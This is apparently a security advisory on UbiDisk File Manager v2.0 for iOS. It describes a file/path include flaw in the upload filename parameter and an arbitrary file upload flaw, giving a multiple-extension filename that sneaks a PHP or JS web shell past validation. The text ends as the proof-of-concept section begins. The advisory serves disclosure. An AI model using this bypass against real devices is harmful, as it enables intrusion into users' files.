Product & Service Introduction:
===============================
In version 2.0 we proudly introduce a very handy file transfer method named EasyPush. EasyPush is the easiest
way so far to exchange files and texts among iPhone, iPad and PC. You can send one or more files to other
devices by just a few taps; or drag-drop any files and folders on PC to iPhone and iPad. It’s never been so
easy like this to transfer files on your devices.

Discovery Status:
=================
Published


Affected Product(s):
====================
Apple AppStore
Product: UbiDisk Mobile Web Application 2.0


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Critical


Technical Details & Description:
================================
1.1
A local file/path include web vulnerability is detected in the UbiDisk File Manager v2.0 mobile web-application (Apple iOS - iPad & iPhone).
The file include vulnerability allows remote attackers to include (upload) local file or path requests to compromise the application or service.

The remote file include web vulnerability is located in the upload module in the file name value. Attacker can inject own file or path requests
by adding regular files. The injected code will be visible in the main index file dir listing and the connected upload path. In the exploitation
phase the vulnerability allows an attacker to combine with script code inject with the file/path request.

Exploitation of the local file include web vulnerability requires no user interaction or privileged application user account with password.
Successful exploitation of the vulnerability results in unauthorized local file and path requests to compromise the device or application.


Vulnerable Application(s):
				[+] UbiDisk File Manager v2.0 - ITunes or AppStore (Apple)

Request Method(s):
				[+] [POST]

Vulnerable Module(s):
				[+] Upload [POST]

Vulnerable Parameter(s):
				[+] filename (name)

Affected Module(s):
				[+] Index File Dir Listing (http://localhost:5080/)



1.2
An arbitrary file upload web vulnerability is detected in the UbiDisk File Manager v2.0 mobile web-application (Apple iOS - iPad & iPhone).
The arbitrary file upload issue allows a remote attacker to upload files with multiple extensions to bypass the validation for unauthorized access.

The vulnerability is located in the upload module when processing to upload files with multiple ending extensions. Attackers are able to upload
a php or js web-shells by renaming the file with multiple extensions. The attacker uploads for example a web-shell with the following name and
extension image.jpg.js.php.jpg . After the upload the attacker needs to open the file in the web application to delete the .jpg file extension
and access the picture with elevated execution access rights.

Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password.
Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.

Vulnerable Application(s):
				[+] UbiDisk File Manager v2.0 - ITunes or AppStore (Apple)

Request Method(s):
				[+] [POST]

Vulnerable Module(s):
				[+] File Upload

Vulnerable Parameter(s):
				[+] filename (multiple extensions)

Affected Module(s):
				[+] File Path Listing (http://localhost:5080/Local/../[FILE PATH]/FILE_NAME)


Proof of Concept (PoC):
=======================
1.1
The local file include web vulnerability can be exploited by by remote attackers without privileged application user account and
also without user interaction. For demonstration or reproduce ...
